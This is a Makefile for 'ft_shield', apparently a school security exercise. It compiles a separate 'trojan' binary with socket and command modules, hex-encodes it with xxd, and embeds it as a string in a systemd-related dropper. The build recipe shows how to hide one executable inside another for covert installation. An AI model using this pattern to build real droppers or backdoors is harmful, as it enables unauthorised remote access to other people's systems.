MAKEFLAGS += -j$(nproc)
MAKEFLAGS += --no-print-directory

CC = cc
CFLAGS = -Wall -Wextra -Werror

MKDIR = mkdir -p
XXD = xxd

NAME = ft_shield
TROJAN = trojan

OBJS = $(addprefix o/,\
	   ft_shield.o\
	   systemd.o\
	   )

TROJAN_OBJS = $(addprefix o/,\
			  trojan.o\
			  lock.o\
			  socket.o\
			  commands.o\
			  )

VPATH = $(wildcard s/*/) s/

all: $(NAME)

$(NAME): $(TROJAN) .WAIT $(OBJS)
	$(CC) $(LDFLAGS) $(OBJS) -o $@ $(LDLIBS)

$(TROJAN): $(TROJAN_OBJS)
	$(CC) $(LDFLAGS) $(TROJAN_OBJS) -o $@ $(LDLIBS)

o:
	@$(MKDIR) $@

o/%.o: %.c | o
	$(CC) $(CPPFLAGS) $(CFLAGS) $< -c -o o/$(notdir $@)

.ONESHELL:
o/ft_shield.o: s/ft_shield.c $(TROJAN_OBJS)
	code=$$($(XXD) -c0 -p < $(TROJAN) | sed 's/../\\x&/g')
	$(CC) -DTROEXE=\"$$code\" $(CPPFLAGS) $(CFLAGS) $< -c -o o/$(notdir $@)

clean:
	$(RM) $(OBJS) $(TROJAN_OBJS)

fclean: clean
	$(RM) $(NAME) $(TROJAN)

re: fclean .WAIT all

.PHONY: all clean fclean re
